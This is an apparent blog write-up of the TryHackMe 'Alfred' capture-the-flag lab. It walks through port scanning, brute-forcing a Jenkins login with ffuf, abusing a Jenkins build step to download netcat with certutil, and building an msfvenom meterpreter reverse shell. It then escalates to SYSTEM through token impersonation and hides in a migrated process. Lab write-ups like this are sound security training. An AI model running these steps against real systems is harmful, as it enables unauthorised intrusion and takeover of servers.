@@ -1,0 +1,364 @@
+I"�{<p><a href="https://www.tryhackme.com/room/alfred"><strong>Solve Yourself »</strong></a></p>
+
+<h1 id="enumeration">ENUMERATION</h1>
+
+<p>Run Network Mapper (<strong>nmap</strong>) on Alfred machine to discover opened ports and services.</p>
+
+<p>Full command :</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap <span class="nt">-sV</span> <span class="nt">-sS</span> <span class="nt">-O</span> <span class="nt">-T4</span> <span class="nt">-p-</span> <span class="o">{</span>machine IP<span class="o">}</span> <span class="nt">-Pn</span> <span class="nt">-oN</span> <span class="o">{</span>outputfile<span class="o">}</span></code></pre></figure>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parameter</th>
+      <th style="text-align: left">Functionality</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">-sV</td>
+      <td style="text-align: left">Probe open ports to determine service/version info</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-sS</td>
+      <td style="text-align: left">SYN, half TCP scan</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-O</td>
+      <td style="text-align: left">Enable OS detection</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-T4</td>
+      <td style="text-align: left">T{0-5} Set scan speed, higher is faster</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-p-</td>
+      <td style="text-align: left">Scan all 65536 ports</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-Pn</td>
+      <td style="text-align: left">Skip host discovery</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-oN</td>
+      <td style="text-align: left">Write output to a file</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Output of the scan:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># Nmap 7.92 scan initiated Tue Dec 28 09:22:17 2021 as: nmap -sV -sS -O -T4 -p- -Pn -oN alfred.nmap 10.10.195.99</span>
+Nmap scan report <span class="k">for </span>10.10.195.99
+Host is up <span class="o">(</span>0.030s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65532 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT     STATE SERVICE    VERSION
+80/tcp   open  http       Microsoft IIS httpd 7.5
+3389/tcp open  tcpwrapped
+8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 <span class="o">(</span>90%<span class="o">)</span>, Microsoft Windows Server 2008 <span class="o">(</span>90%<span class="o">)</span>, Microsoft Windows Server 2008 R2 <span class="o">(</span>90%<span class="o">)</span>, Microsoft Windows Server 2008 R2 or Windows 8 <span class="o">(</span>90%<span class="o">)</span>, Microsoft Windows 7 SP1 <span class="o">(</span>90%<span class="o">)</span>, Microsoft Windows 8.1 Update 1 <span class="o">(</span>90%<span class="o">)</span>, Microsoft Windows 8.1 R1 <span class="o">(</span>90%<span class="o">)</span>, Microsoft Windows Phone 7.5 or 8.0 <span class="o">(</span>90%<span class="o">)</span>, Microsoft Windows 7 or Windows Server 2008 R2 <span class="o">(</span>89%<span class="o">)</span>, Microsoft Windows Server 2008 or 2008 Beta 3 <span class="o">(</span>89%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Tue Dec 28 09:24:13 2021 -- 1 IP address (1 host up) scanned in 115.63 seconds</span></code></pre></figure>
+
+<p>Three ports are opened:</p>
+<h2 id="port-80-http-microsoft-iis-httpd-75">Port 80 http Microsoft IIS httpd 7.5</h2>
+<p>Ordinary <a href="https://en.wikipedia.org/wiki/Internet_Information_Services"><strong>Microsoft IIS</strong></a> web server.
+<br />Nothing fancy here.
+<img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/2.png" alt="" /></p>
+
+<h2 id="port-3389-tcpwrapped">Port 3389 tcpwrapped</h2>
+<p><strong>tcpwrapped</strong> means that the remote host closed the connection after completing the TCP three-way handshake without receiving any data.
+<br /><a href="https://secwiki.org/w/FAQ_tcpwrapped"><strong>More information here</strong>.</a>
+<br />However, port 3389 typically used for <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol">RDP</a> protocol.</p>
+
+<h2 id="port-8080-jetty-94z-snapshot">Port 8080 Jetty 9.4.z-SNAPSHOT</h2>
+
+<p>There is a <a href="https://www.geeksforgeeks.org/what-is-jenkins/"><strong>Jenkins</strong></a> login prompt on port 8080.
+<br /><img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/3.png" alt="" /><br />
+If you google it, you will see the default login credentials for Jenkins is <strong>admin</strong> for the username and <strong>admin</strong> for the password.
+However, the system administrator could have changed the password to a different one. In that case default credentials
+would be useless. So we will brute force the credentials for best practice.<br /></p>
+
+<h1 id="exploitation">EXPLOITATION</h1>
+
+<p>In order to create continuous HTTP requests, we have to know how the HTTP request looks.
+Launch the <a href="https://www.geeksforgeeks.org/what-is-burp-suite/"><strong>Burp Suite</strong></a> to examine the HTTP POST request sent 
+when a login attempt occurs.
+<img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/4.png" alt="" /><em>Request</em><br /><br />
+There are three fields we have to make sure they are being sent with the HTTP request we will forge for this form.</p>
+<ol>
+  <li><a href="https://www.w3.org/TR/html401/interact/forms.html#h-17.13.4"><strong>application/x-www-form-urlencoded</strong></a> : Encoding type</li>
+  <li><strong>j_username</strong> : Username field</li>
+  <li><strong>j_password</strong> : Password Field</li>
+</ol>
+
+<p>I will use <a href="https://cybersecnerds.com/ffuf-everything-you-need-to-know/"><strong>ffuf</strong></a> to create POST requests toward the web server.
+You can use any fuzzer tool like <strong>THC Hydra</strong>, <strong>Burp Suite</strong> or others. 
+<br />Download <a href="https://github.com/danielmiessler/SecLists"><strong>SecLists</strong></a> repo with prepeared wordlists included.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parameter</th>
+      <th style="text-align: left">Functionality</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">-w</td>
+      <td style="text-align: left">Dedicated wordlists</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-u</td>
+      <td style="text-align: left">Target URL</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-data</td>
+      <td style="text-align: left">Data which will be sent with the request</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-H</td>
+      <td style="text-align: left">HTTP headers that will be sent with the request</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-fr</td>
+      <td style="text-align: left">Regex which will be filtered out</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Full command:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ffuf <span class="nt">-w</span> SecLists/Usernames/top-usernames-shortlist.txt:W1,SecLists/Passwords/Common-Credentials/best1050.txt:W2 <span class="nt">-u</span> <span class="s2">"http://10.10.56.186:8080/j_acegi_security_check"</span> <span class="nt">-data</span> <span class="s2">"j_username=W1&amp;j_password=W2"</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/x-www-form-urlencoded"</span> <span class="nt">-fr</span> <span class="s2">"loginError"</span></code></pre></figure>
+
+<p><img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/6.png" alt="" /><strong>Cracked the credentials, well done :)</strong><br /><br />
+A possible question would be, why filter out “loginError” string ? 
+<img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/5.png" alt="" /><em>Left: Request - Right:Response</em><br /><br />
+That sent request got a response with <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302"><strong>HTTP 302 status code</strong></a>, which is the status code for redirection.
+It means whenever the application receives invalid credentials from the client; the server redirects the client to the “/loginError” URL.
+Based on this, as long as the HTTP response does not include “/loginError” in it, it is safe to say we have sent a valid username-password pair
+to the server.
+<br /><br />
+<img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/7.png" alt="" /><strong>Login to the Jenkins panel via credentials.</strong></p>
+
+<p>It is possible to do anything that Jenkins can do since we have an admin portal right now.However, if we could get a shell from the
+system, it would be amazing.<br /><br />
+The way to get a shell from the system is to make Jenkins transmit and execute code in the system shell.<br />
+Click on the first project named as <strong>project</strong>, then click <strong>configure</strong>.
+Scroll down to the bottom, and you will see a box that executes the windows command written in it.
+<img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/9.png" alt="" /><br />
+On the project page, there is a <strong>Build History</strong> section. It is available to check the output of the batch command that had run.
+<img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/8.png" alt="" />
+Now, instead of printing the string value of the user who executes it with the <strong>whoami</strong> command, we have to connect to that shell.</p>
+
+<p><br />I will use <a href="https://www.ionos.com/digitalguide/server/tools/netcat/"><strong>Netcat</strong></a> in this manner. It is required to have Netcat downloaded in both the attacker and the
+victim machine.</p>
+<ul>
+  <li>Download static <a href="https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe"><strong>nc.exe</strong></a> binary for to run it in the victim machine</li>
+  <li>Start a Python3 server in the directory that includes the Netcat static binary file.
+<br />Run:</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80</code></pre></figure>
+
+<p><img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/10.png" alt="" /></p>
+<ul>
+  <li>Start a Netcat listener in the attacker machine.
+<br />Run:</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">nc <span class="nt">-nvlp</span> <span class="o">{</span>ANY FREE PORT<span class="o">}</span></code></pre></figure>
+
+<p><img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/11.png" alt="" /></p>
+<ul>
+  <li>Download the static binary to the victim machine from the Python web server and run it.</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">certutil.exe</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">http://</span><span class="p">{</span><span class="n">THM</span><span class="w"> </span><span class="nx">IP</span><span class="p">}:</span><span class="mi">80</span><span class="n">/nc.exe</span></code></pre></figure>
+
+<p><img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/12.png" alt="" /></p>
+<ul>
+  <li>Click <strong>Build</strong> button on the project page.
+<img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/13.png" alt="" /></li>
+</ul>
+
+<p>A get request was made to the web server.
+<img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/14.png" alt="" />
+Then we got the shell.
+<img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/15.png" alt="" /><strong>We are in, nice progress ;)</strong>
+To get user flag, run:</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="kr">type</span><span class="w"> </span><span class="s2">"C:\Users\Bruce\Desktop\user.txt"</span></code></pre></figure>
+
+<h1 id="windows-tokens">WINDOWS TOKENS</h1>
+<p>This machine focuses on the Windows access tokens and escalate privileges with them.</p>
+
+<h2 id="what-is-an-access-token-">What is an access token ?</h2>
+
+<p>An access token consists of:</p>
+<ul>
+  <li>Privileges</li>
+  <li>Group SIDs(security identifier)</li>
+  <li>User SIDs
+amongst other things.
+<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens"><strong>Much more detailed information here.</strong></a></li>
+</ul>
+
+<p>An <a href="https://docs.microsoft.com/en-us/windows/win32/secgloss/a-gly">access token</a> contains the security 
+information for a logon session. The system creates an access token when a user logs on, and every process 
+executed on behalf of the user has a copy of the token. The token identifies the user, the user’s groups, 
+and the user’s privileges. The system uses the token to control access to securable objects and to control 
+the ability of the user to perform various system-related operations on the local computer. 
+There are two kinds of access token, <strong>primary</strong> and <strong>impersonation</strong>.
+<br /><br />There are two types access tokens, according to <a href="https://docs.microsoft.com/en-us/"><strong>Windows Docs</strong></a>:</p>
+<ul>
+  <li><a href="https://docs.microsoft.com/en-us/windows/win32/secgloss/p-gly">Primary tokens</a>: An access token that is typically created 
+only by the Windows kernel. It may be assigned to a process to represent the default security information for that process.</li>
+  <li><a href="https://docs.microsoft.com/en-us/windows/win32/secgloss/i-gly">Impersonation tokens</a>: An access token that has been created 
+to capture the security information of a client process, allowing a server to “impersonate” the client 
+process in security operations. It becomes convenient when you are the local admin on a system and want to
+impersonate another logged on client, e.g. a domain admin.
+<br /><br />There are four levels for impersonation token:
+    <ul>
+      <li><strong>SecurityAnonymous</strong>: current user/account/client cannot impersonate another user/account/client.</li>
+      <li><strong>SecurityIdentification</strong>: current user/account/client can get the privileges and identity of a user, but cannot impersonate the user.</li>
+      <li><strong>SecurityImpersonation</strong>: current user/account/client can impersonate user’s security context on the local system.</li>
+      <li><strong>SecurityDelegation</strong>: current user/account/client can impersonate user’s security context on a remote system.</li>
+    </ul>
+  </li>
+</ul>
+
+<p>The security context is a data structure that stores clients’ security information.</p>
+
+<h3 id="diffrence-between-proceesses-hierarchy-in-unix-and-windows">Diffrence between proceesses hierarchy in UNIX and Windows</h3>
+<h3 id="unix">unix</h3>
+<p>In UNIX like operating systems, there is the child-parent process hierarchy. Whenever a process
+creates a new process, the creating process becomes the parent while created process becomes the child. And the child process
+inherits all the permissions from its’ parent. If the parent dies, the child becomes an <a href="https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c/">orphan or zombie process</a>.</p>
+
+<h3 id="windows">windows</h3>
+
+<p>The parent-child relationship does not exist for the Windows environment. 
+However, I will refer to them as parent-child to facilitate the explanation.
+Whenever a new process is initiated, the parent process receives an ID and the process handler of the child process.
+It simulates the hierarchial relationship if the application requires it to do so. The child process copies the access 
+token of its’ parent which is created by <strong>LSASS.exe</strong> on logon. However, windows treats all processes as belonging to the 
+same generation.</p>
+
+<h4 id="what-is-the-lsassexe-">what is the LSASS.exe ?</h4>
+<p>LSASS.exe, <strong>Local Security Authority Process</strong>, is responsible for authenticating accounts
+in the WinLogon service. The process is operated by using authentication packages such as the default msgina.dll. When the user
+authenticates, lsass.exe generates a <strong>user access token</strong>, which is then used to launch the initial shell. <strong>Other processes that
+the account initiates inherit from this token</strong>.</p>
+
+<h3 id="commons">commons</h3>
+<p>Both Windows and UNIX processes inherit the security settings of the creating process by default.
+Signals, Exceptions, and Events.</p>
+
+<h1 id="privilege-escalation">PRIVILEGE ESCALATION</h1>
+
+<p>After gaining the initial access to the target machine, the first step will be to check the account’s permissions on the system.</p>
+
+<p><br />Run: <strong>whoami /priv</strong></p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files</span><span class="w"> </span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="n">\Jenkins\workspace\project</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
+
+</span><span class="n">PRIVILEGES</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="o">----------------------</span><span class="w">
+
+</span><span class="n">Privilege</span><span class="w"> </span><span class="nx">Name</span><span class="w">                  </span><span class="nx">Description</span><span class="w">                               </span><span class="nx">State</span><span class="w">
+</span><span class="o">===============================</span><span class="w"> </span><span class="o">=========================================</span><span class="w"> </span><span class="o">========</span><span class="w">
+</span><span class="n">SeIncreaseQuotaPrivilege</span><span class="w">        </span><span class="nx">Adjust</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">quotas</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">process</span><span class="w">        </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeSecurityPrivilege</span><span class="w">             </span><span class="nx">Manage</span><span class="w"> </span><span class="nx">auditing</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">security</span><span class="w"> </span><span class="nx">log</span><span class="w">          </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeTakeOwnershipPrivilege</span><span class="w">        </span><span class="nx">Take</span><span class="w"> </span><span class="nx">ownership</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">files</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">other</span><span class="w"> </span><span class="nx">objects</span><span class="w">  </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeLoadDriverPrivilege</span><span class="w">           </span><span class="nx">Load</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">unload</span><span class="w"> </span><span class="nx">device</span><span class="w"> </span><span class="nx">drivers</span><span class="w">            </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeSystemProfilePrivilege</span><span class="w">        </span><span class="nx">Profile</span><span class="w"> </span><span class="nx">system</span><span class="w"> </span><span class="nx">performance</span><span class="w">                </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeSystemtimePrivilege</span><span class="w">           </span><span class="nx">Change</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">system</span><span class="w"> </span><span class="nx">time</span><span class="w">                    </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeProfileSingleProcessPrivilege</span><span class="w"> </span><span class="nx">Profile</span><span class="w"> </span><span class="nx">single</span><span class="w"> </span><span class="nx">process</span><span class="w">                    </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeIncreaseBasePriorityPrivilege</span><span class="w"> </span><span class="nx">Increase</span><span class="w"> </span><span class="nx">scheduling</span><span class="w"> </span><span class="nx">priority</span><span class="w">              </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeCreatePagefilePrivilege</span><span class="w">       </span><span class="nx">Create</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">pagefile</span><span class="w">                         </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeBackupPrivilege</span><span class="w">               </span><span class="nx">Back</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="nx">files</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">directories</span><span class="w">             </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeRestorePrivilege</span><span class="w">              </span><span class="nx">Restore</span><span class="w"> </span><span class="nx">files</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">directories</span><span class="w">             </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeShutdownPrivilege</span><span class="w">             </span><span class="nx">Shut</span><span class="w"> </span><span class="nx">down</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">system</span><span class="w">                      </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeDebugPrivilege</span><span class="w">                </span><span class="nx">Debug</span><span class="w"> </span><span class="nx">programs</span><span class="w">                            </span><span class="nx">Enabled</span><span class="w"> </span><span class="err">&lt;</span><span class="o">--</span><span class="w">
+</span><span class="n">SeSystemEnvironmentPrivilege</span><span class="w">    </span><span class="nx">Modify</span><span class="w"> </span><span class="nx">firmware</span><span class="w"> </span><span class="nx">environment</span><span class="w"> </span><span class="nx">values</span><span class="w">        </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeChangeNotifyPrivilege</span><span class="w">         </span><span class="nx">Bypass</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="nx">checking</span><span class="w">                  </span><span class="nx">Enabled</span><span class="w">
+</span><span class="n">SeRemoteShutdownPrivilege</span><span class="w">       </span><span class="nx">Force</span><span class="w"> </span><span class="nx">shutdown</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">remote</span><span class="w"> </span><span class="nx">system</span><span class="w">       </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeUndockPrivilege</span><span class="w">               </span><span class="nx">Remove</span><span class="w"> </span><span class="nx">computer</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">docking</span><span class="w"> </span><span class="nx">station</span><span class="w">      </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeManageVolumePrivilege</span><span class="w">         </span><span class="nx">Perform</span><span class="w"> </span><span class="nx">volume</span><span class="w"> </span><span class="nx">maintenance</span><span class="w"> </span><span class="nx">tasks</span><span class="w">          </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeImpersonatePrivilege</span><span class="w">          </span><span class="nx">Impersonate</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">client</span><span class="w"> </span><span class="nx">after</span><span class="w"> </span><span class="nx">authentication</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="err">&lt;</span><span class="o">--</span><span class="w">
+</span><span class="n">SeCreateGlobalPrivilege</span><span class="w">         </span><span class="nx">Create</span><span class="w"> </span><span class="nx">global</span><span class="w"> </span><span class="nx">objects</span><span class="w">                     </span><span class="nx">Enabled</span><span class="w"> </span><span class="err">&lt;</span><span class="o">--</span><span class="w">
+</span><span class="n">SeIncreaseWorkingSetPrivilege</span><span class="w">   </span><span class="nx">Increase</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">working</span><span class="w"> </span><span class="nx">set</span><span class="w">            </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeTimeZonePrivilege</span><span class="w">             </span><span class="nx">Change</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">time</span><span class="w"> </span><span class="nx">zone</span><span class="w">                      </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeCreateSymbolicLinkPrivilege</span><span class="w">   </span><span class="nx">Create</span><span class="w"> </span><span class="nx">symbolic</span><span class="w"> </span><span class="nx">links</span><span class="w">                     </span><span class="nx">Disabled</span></code></pre></figure>
+
+<p>Those are the privileges of the current user which are inherited from a group or given to the account when created. 
+However, only three of them stated as <em>Enabled</em>.
+<br /><br /><a href="https://github.com/gtworek/Priv2Admin">Here</a> is the full list of exploitable privileges.
+<br />And <a href="https://www.exploit-db.com/papers/42556">here</a> is the detailed documentation of abusing token privileges.
+<br />Also a great video resource <a href="https://www.youtube.com/watch?v=QRpfvmMbDMg">here</a> about token handling vulnerabilities.</p>
+
+<p>We will need a module called <a href="https://labs.f-secure.com/archive/incognito-v2-0-released/">incognito</a>.
+Therefore I will use <strong>Metasploit Framework</strong> while it has the incognito module built-in.</p>
+
+<p>The one I will be exploiting is the <strong>SeImpersonatePrivilege</strong>.
+Follow these steps to get <a href="https://superuser.com/questions/471769/what-is-the-nt-authority-system-user">NT AUTHORITY\SYSTEM</a> privileges.</p>
+<ul>
+  <li>Create a meterpreter reverse shell binary.</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nt">-a</span> x86 <span class="nt">--encoder</span> x86/shikata_ga_nai <span class="nv">LHOST</span><span class="o">={</span>THM IP<span class="o">}</span> <span class="nv">LPORT</span><span class="o">={</span>SOME FREE PORT<span class="o">}</span><span class="nt">-f</span> exe <span class="nt">-o</span> ashell.exe</code></pre></figure>
+
+<ul>
+  <li>Upload the executable to the target machine.</li>
+  <li>Start a reverse tcp listener with metasploit:</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">msfconsole <span class="nt">-q</span>
+msf6 use exploit exploit/multi/handler
+msf6 <span class="nb">set </span>payload windows/meterpreter/reverse_tcp
+msf6 <span class="nb">set </span>LHOST <span class="o">{</span>THM IM<span class="o">}</span>
+msf6 <span class="nb">set </span>LPORT <span class="o">{</span>THE PORT DECLARED FOR EXECUTABLE BEFORE<span class="o">}</span>
+msf6 run</code></pre></figure>
+
+<p><img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/16.png" alt="" /><br /></p>
+<ul>
+  <li>After successfully receiving the meterpreter console, load the incognito module.
+<br />Run:</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">msf6 load incognito</code></pre></figure>
+
+<p><img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/17.png" alt="" /><br />
+Then, list all the available tokens:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">list_tokens <span class="nt">-g</span></code></pre></figure>
+
+<p>There will be a delegation token called “BULTIN\Administrators”. We will impersonate that token.
+Delegation and impersonation levels are identical locally.</p>
+<ul>
+  <li>Run:</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">impersonate_token <span class="s2">"BUILTIN</span><span class="se">\A</span><span class="s2">dministrators"</span></code></pre></figure>
+
+<p>If everything were successfully done, <strong>NT AUTHORITY\SYSTEM</strong> should be the output of the <strong>getuid</strong> command.
+<img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/18.png" alt="" /></p>
+<ul>
+  <li>Run <strong>ps</strong> to list all processes. Find one running with NT AUTHORITY\SYSTEM privileges, than migrate meterpreter process into it.</li>
+</ul>
+
+<p><img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/19.png" alt="" /><br />
+By doing that, we have camouflaged our malicious process into a safer looking one.
+<br /><img src="/assets/img/posts/tryhackme-alfred-ctf-writeup/20.png" alt="" /><br />
+<br />To get the root flag, run:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">onfig</span><span class="se">\r</span><span class="s2">oot.txt"</span></code></pre></figure>
+
+<p><br /></p>
+:ET
